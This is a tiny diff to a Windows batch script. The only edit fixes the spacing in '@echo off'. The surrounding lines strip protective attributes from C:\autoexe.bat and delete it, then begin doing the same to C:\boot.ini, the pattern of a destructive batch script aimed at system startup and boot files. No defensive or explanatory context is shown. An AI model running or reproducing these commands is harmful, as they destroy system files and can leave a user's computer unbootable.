@@ -1,4 +1,4 @@
-@ echo off
+@echo off
 attrib -r -s -h C:\autoexe.bat
 del C:\autoexe.bat
 attrib -r -s -h C:\boot.ini
